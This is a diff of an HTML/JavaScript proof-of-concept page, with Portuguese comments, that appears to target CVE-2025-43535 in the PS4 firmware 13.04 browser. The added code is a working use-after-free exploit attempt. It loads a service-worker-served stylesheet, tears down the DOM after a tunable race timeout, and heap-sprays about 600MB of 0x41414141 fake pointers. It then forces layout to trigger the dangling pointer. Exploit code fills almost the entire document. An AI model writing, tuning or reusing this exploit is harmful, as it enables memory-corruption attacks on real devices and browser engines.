@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 (Remote PoC)</title>
+<title>CVE-2025-43535 — UAF / Heap Spray</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<div>CVE-2025-43535 · PS4 FW 13.04 (GitHub Mode)</div>
+<div>CVE-2025-43535 · UAF Race Condition · PS4 FW 13.04</div>
 <div id="log"></div>
 <div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
 
@@ -24,55 +24,92 @@ const L = (m, c) => {
   d.scrollTop = d.scrollHeight;
 };
 
-async function run() {
-  L('Iniciando PoC Remoto via Service Worker...', 'warn');
+// ==========================================
+// CONFIGURAÇÃO DO HEAP SPRAY
+// ==========================================
+// Vamos criar blocos de 4MB preenchidos com o marcador 0x41414141
+const SPRAY_CHUNK_SIZE = 1024 * 1024; // 1 Milhão de inteiros de 32-bits = 4MB
+const sprayData = new Uint32Array(SPRAY_CHUNK_SIZE);
+sprayData.fill(0x41414141); // O ponteiro falso que queremos injetar
 
-  if (!('serviceWorker' in navigator)) {
-    L('Erro: Service Worker não suportado ou bloqueado.', 'fail');
-    return;
+const heapSprayArray = [];
+
+function fireHeapSpray() {
+  L('INICIANDO HEAP SPRAY! Pulverizando RAM com 0x41414141...', 'warn');
+  try {
+    // Alocamos cerca de 600MB de dados falsos instantaneamente.
+    // O objetivo é ocupar o exato espaço físico na RAM que o WebKit 
+    // liberou ao destruirmos a árvore do CSS.
+    for (let i = 0; i < 150; i++) { 
+      const chunk = new Uint32Array(sprayData);
+      heapSprayArray.push(chunk);
+    }
+    L('Heap Spray concluído: ~600MB alocados em JS.', 'ok');
+  } catch (e) {
+    L('Heap Spray OOM no JS: ' + e, 'fail');
   }
+}
+
+// ==========================================
+// LÓGICA DO EXPLOIT (RACE CONDITION)
+// ==========================================
+// O TEMPO MÁGICO: Isso dita quando vamos puxar o tapete.
+// Se for muito alto, o PS4 dá OOM. Se for muito baixo, a árvore não fica profunda o suficiente.
+// Leandro, você precisará afinar esse valor (ex: tente 50, 80, 120, 150)
+const RACE_TIMEOUT_MS = 95; 
+
+async function run() {
+  L('Preparando Race Condition (Bait and Switch)...', 'info');
+
+  if (!('serviceWorker' in navigator)) return;
 
   try {
-    // 1. Instala o "Servidor Virtual"
     await navigator.serviceWorker.register('sw.js');
-    L('Service Worker instalado no GitHub Pages.', 'ok');
-
-    // Aguarda o SW assumir o controle (necessário na primeira visita)
     if (!navigator.serviceWorker.controller) {
-      L('Aguardando controle do SW... A página vai recarregar automaticamente.', 'warn');
-      setTimeout(() => window.location.reload(), 1500);
+      setTimeout(() => window.location.reload(), 500);
       return;
     }
 
-    L('SW ativo. O JS consumirá quase 0MB de RAM a partir de agora.', 'ok');
-    L('Solicitando 1044MB de CSS diretamente para o C++...', 'warn');
+    L('Service Worker pronto. Iniciando a isca...', 'ok');
 
-    // 2. Dispara a requisição. O SW vai interceptar 'payload.css'
+    // 1. A Isca (Cria a árvore complexa)
+    const el = document.createElement('div');
+    el.className = 't';
+    document.getElementById('stage').appendChild(el);
+
     const link = document.createElement('link');
     link.rel = 'stylesheet';
     link.href = 'payload.css'; 
-
-    link.onload = () => {
-      L('1044MB Carregados no C++. Disparando Style Resolver...', 'warn');
-      const el = document.createElement('div');
-      el.className = 't';
-      document.getElementById('stage').appendChild(el);
-
-      setTimeout(() => {
-        try {
-          void el.offsetWidth; // O gatilho mortal
-          L('Sobreviveu ao layout. (Não deu crash)', 'ok');
-        } catch(e) { L('Falha no layout: ' + e, 'fail'); }
-      }, 100);
-    };
-
-    link.onerror = () => L('Erro na rede. O SW falhou em gerar o payload.', 'fail');
-
-    L('Aguarde. O PS4 vai processar silenciosamente...', 'info');
     document.head.appendChild(link);
 
+    L(`Esperando ${RACE_TIMEOUT_MS}ms para o C++ se afogar na árvore...`, 'warn');
+
+    // 2. A Puxada de Tapete
+    setTimeout(() => {
+      L('PUXANDO O TAPETE! Deletando DOM e abortando CSS...', 'crash');
+      
+      // Removemos do DOM. O WebKit tenta limpar os nós C++
+      document.head.removeChild(link);
+      document.getElementById('stage').innerHTML = ''; 
+
+      // 3. O Heap Spray (Substitui os objetos antigos pelo nosso payload)
+      fireHeapSpray();
+
+      // 4. O Gatilho (Força o motor a se recalcular)
+      L('Forçando layout global para engatilhar o Dangling Pointer...', 'warn');
+      try {
+        void document.body.offsetWidth;
+      } catch(e) {}
+
+      L('-------------------------------------', 'info');
+      L('Se o console crashear AGORA, e os logs do PS4 mostrarem falha', 'crash');
+      L('no endereço 0x41414141, VOCÊ CONSEGUIU UM UAF!', 'ok');
+      L('-------------------------------------', 'info');
+
+    }, RACE_TIMEOUT_MS);
+
   } catch (error) {
-    L('Falha Crítica: ' + error, 'fail');
+    L('Erro: ' + error, 'fail');
   }
 }
 
